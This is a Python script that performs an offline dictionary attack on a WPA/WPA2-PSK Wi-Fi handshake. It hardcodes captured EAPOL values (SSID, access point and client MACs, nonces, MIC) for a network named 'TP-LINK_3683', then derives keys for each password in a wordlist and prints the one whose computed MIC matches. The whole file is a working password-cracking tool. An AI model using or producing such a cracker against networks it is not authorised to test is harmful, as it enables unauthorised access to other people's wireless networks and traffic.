from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import HMAC, SHA1

ssid = "TP-LINK_3683"  # e. g. from (overall) 1st packet

# EAPOL packet 1
anonce = bytes.fromhex("bbe37b539331a77688322c233404448dd721f50f27656e1269e8f08a4cdb03fa")

# EAPOL packet 2
data2 = bytes.fromhex("0103007502010a00000000000000000001e9fc9d2ba9bafdd9efe44765631649223ff3438ab788b2746dabcc14d04cae770000000000000000000000000000000000000000000000000000000000000000877b50e50a826967bdb7309f40a6c7da001630140100000fac040100000fac040100000fac020000")
snonce = bytes.fromhex("e9fc9d2ba9bafdd9efe44765631649223ff3438ab788b2746dabcc14d04cae77")
mic2 = bytes.fromhex("877b50e50a826967bdb7309f40a6c7da")

# https://praneethwifi.in/2019/11/09/4-way-hand-shake-keys-generation-and-mic-verification/
# https://web.archive.org/web/20201111234114/https://www.ins1gn1a.com/understanding-wpa-psk-cracking/

# some weird pseudo-random function
def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen*8 + 159)/160):
        hmacsha1 = HMAC.new(key, A+bytes([0x00])+B+bytes([i]), SHA1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]

ap_mac = bytes.fromhex("18a6f72e3683")  # access point MAC
s_mac = bytes.fromhex("c0b5d7264137")  # client MAC
data2 = data2.replace(mic2, b"\x00"*16)  # replace MIC field by zeroes before calculating MIC
macs_and_nonces = min(ap_mac, s_mac) + max(ap_mac, s_mac) + min(anonce, snonce) + max(anonce, snonce)
pke = "Pairwise key expansion".encode()

# path leads to password wordlist
for line in open("C:/your/path/test.txt", "r", encoding="utf-8"):
    try:
        pwd = line.strip()
        pmk = PBKDF2(pwd, ssid.encode(), 32, 4096)  # 32*8 = 256 bit output
        ptk = customPRF512(pmk, pke, macs_and_nonces)
        KCK = ptk[:16]  # key confirmation key
        calculated_mic2 = HMAC.new(KCK, data2, digestmod=SHA1).digest()[:16]
        if mic2 == calculated_mic2:
            print(pwd)
            break
    except Exception:
        continue